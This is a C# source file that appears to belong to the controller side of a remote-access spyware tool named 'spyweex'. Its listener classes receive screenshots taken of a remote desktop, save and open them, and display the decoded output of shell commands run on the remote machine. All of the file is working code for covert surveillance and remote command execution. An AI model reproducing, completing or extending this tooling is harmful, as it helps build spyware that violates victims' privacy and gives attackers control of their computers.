using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Threading.Tasks;
using System.Windows.Threading;
using spyweex_client_wpf.StaticStrings;

namespace spyweex_client_wpf
{
    internal abstract class ISubscriber
    {
        public IDisposable subscriberToken;
        public bool isSubscribed = false;
        protected Dispatcher dispatcher;

        //public abstract void Subscribe(ref WxhtpClient wxhtpClient);

        public async void UnsubscribeAsync()
        {
            await Task.Factory.StartNew(() =>
            {
                if (isSubscribed)
                {
                    isSubscribed = false;
                    subscriberToken.Dispose();
                }
            }
                );

        }
    }

    internal class DScreenListener : ISubscriber
    {
        public DScreenListener(Dispatcher dispatcher)
        {
            this.dispatcher = dispatcher;
        }
        public void Subscribe(ref WxhtpClient wxhtpClient)
        {
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(Scheduler.TaskPool).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    if (resp.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_DESKTOP_SCREEN))
                    {
                        using (Image image = Image.FromStream(new MemoryStream(resp.content)))
                        {
                            image.Save("output.jpg", ImageFormat.Jpeg);  // Or Png
                        }
                        System.Diagnostics.Process.Start("output.jpg");
                        Debug.WriteLine("Task Completed");
                        UnsubscribeAsync();
                    }
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBox.Show("Error occured in Desktop screen subscriber " + (Exception)err);
                }

                );
            subscriberToken = idisp;
        }
    }

    internal class CmdExecListener : ISubscriber
    {
        public CmdExecListener(Dispatcher dispatcher)
        {
            this.dispatcher = dispatcher;
        }
        public void Subscribe(ref WxhtpClient wxhtpClient, MainForm.updateCmdTextBoxDelegate updateCmdTextBox)
        {
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(Scheduler.TaskPool).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    string result;
                    if (resp.headers.ContainsKey("Encoding"))
                    {
                        Encoding enc = Encoding.GetEncoding(Int32.Parse(resp.headers["Encoding"]));
                        result = enc.GetString(resp.content);
                    }
                    else
                    {
                        result = resp.content.ToString();
                    }

                    updateCmdTextBox("", result);
                    //Dispatcher.CurrentDispatcher.BeginInvoke(new Action(
                    //    () =>
                    //    {
                    //        Form1.
                    //    }
                    //    ));
                    //PrintToCmdTextBox("", result);
                }
           );
            subscriberToken = idisp;

        }
    }
}
